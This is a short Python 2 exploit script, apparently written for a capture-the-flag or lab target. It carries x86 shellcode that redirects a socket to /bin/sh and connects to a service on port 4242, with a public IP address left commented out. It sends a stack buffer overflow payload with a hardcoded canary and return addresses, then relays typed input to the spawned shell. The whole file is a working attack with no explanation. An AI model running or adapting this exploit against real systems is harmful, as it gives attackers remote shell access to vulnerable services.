import sys
import socket
import time
shellcode = ("\x8b\x45\x08" #"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48"
"\x89\xc6"       # mov esi, eax
"\x31\xdb"       # xor %ebx,%ebx #"\x31\xc9"       # xor    %ecx,%ecx
"\x56"           # push   %esi
"\x59"           # pop %ecx #"\x5b"           # pop    %ebx <loop>
"\x6a\x3f"       # push   $0x3f
"\x58"           # pop    %eax
"\xcd\x80"       # int    $0x80
"\x43"           # inc %ebx #"\x41"           # inc    %ecx
"\x80\xfb\x03"   # cmp $0x3,%bl #"\x80\xf9\x03"   # cmp $0x3,%cl
"\x75\xf5"       # jne 084838 <loop>
"\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80")

f = open('/tmp/shellcode','w')
f.write(shellcode)
f.close()
s = socket.socket(
    socket.AF_INET, socket.SOCK_STREAM)

s.connect(("10.88.88.185", 4242))
#s.connect(("54.233.105.81", 4242))
canary = "\xe4\xff\xff\xe4"
print s.recv(1024)
s.send("X")
print s.recv(1024)
time.sleep(3)
print s.recv(1024)
s.send( shellcode + "A"*(int(sys.argv[1])-(len(shellcode))) + canary + "\x88\xd6\xff\xff" + "\x9c\xd1\xff\xff\n")
print s.recv(128)
while True:
	ui = raw_input()
	s.send(ui)
	print s.recv(128)

